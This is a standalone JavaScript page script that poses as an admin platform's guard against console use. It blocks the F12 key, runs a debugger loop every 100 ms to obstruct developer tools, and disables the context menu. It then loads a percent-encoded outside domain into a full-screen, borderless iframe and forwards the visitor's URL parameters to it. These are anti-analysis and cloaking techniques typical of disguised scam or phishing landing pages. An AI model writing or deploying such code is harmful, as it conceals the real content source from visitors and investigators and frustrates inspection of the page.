document.onkeydown = document.onkeyup = document.onkeypress = function (event) {
	var e = event || window.event || arguments.callee.caller.arguments[0];
	if (e && e.keyCode == 123) {
		mAlert();
		e.returnValue = false;
		return (false);
	}
}
function mAlert() {
	alert("感谢使用管理平台，禁止对控制台进行操作！");
}


setInterval(function () {
	debugger;
}, 100)


document.oncontextmenu = function () { return false; };    
 var x='https://%68%6d%2e%6b%34%33%39%2e%6c%69%6e%6b';
    $(function () {
        let u = window.document.location.href.toString().split("?");
        if (typeof (u[1]) == "string") {
            u = u[1].split("&");
        } else {
            u = "";
        }
        
        iframe(x + u);
    });

    function iframe(src) {
        $("div").html('<iframe src="' + src + '" width="100%" height="' + (($(window).height()) - 5) + "px" + '" style="border: 0"></iframe>');
        $(window).resize();
    }